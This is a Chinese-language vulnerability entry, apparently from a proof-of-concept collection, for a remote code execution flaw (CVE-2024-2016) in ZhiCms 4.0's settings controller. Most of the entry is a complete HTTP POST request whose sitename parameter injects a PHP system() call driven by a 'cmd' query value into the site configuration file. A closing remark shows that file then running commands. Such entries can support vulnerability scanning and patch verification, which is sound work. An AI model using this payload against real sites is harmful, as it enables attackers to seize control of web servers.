﻿# ZhiCms 4.0 RCE漏洞

> 更新时间：2024-04-30

> 漏洞编号：CVE-2024-2016

> 漏洞说明：RCE漏洞代码文件app/manage/controller/setcontroller.php中的index函数。通过参数sitename可以导致代码注入。该漏洞编号为CVE-2024-2016。攻击者可以远程发起攻击。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /index.php?r=manage/set/index HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=96d562012a5fde8577cbd6ea765d69ed
Connection: close

sitename=')%3Bsystem(%24_GET%5B'cmd'%5D)%3B%2F*&hosturl=&logo=public%2Fweb%2Fimages%2Flogoh2014r.png&ewm=public%2Fweb%2Fimages%2Flogoh2014r.png&appkey=&secretKey=&pid=&apiurl=https%3A%2F%2Fwww.baidu.com%2F&code=&zhuan=0&download=
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：ZhiCms 4.0 RCE漏洞.poc

```
备注说明：
RCE :http://xxx.com/data/config/siteconfig.php?cmd=open -a Calculator
```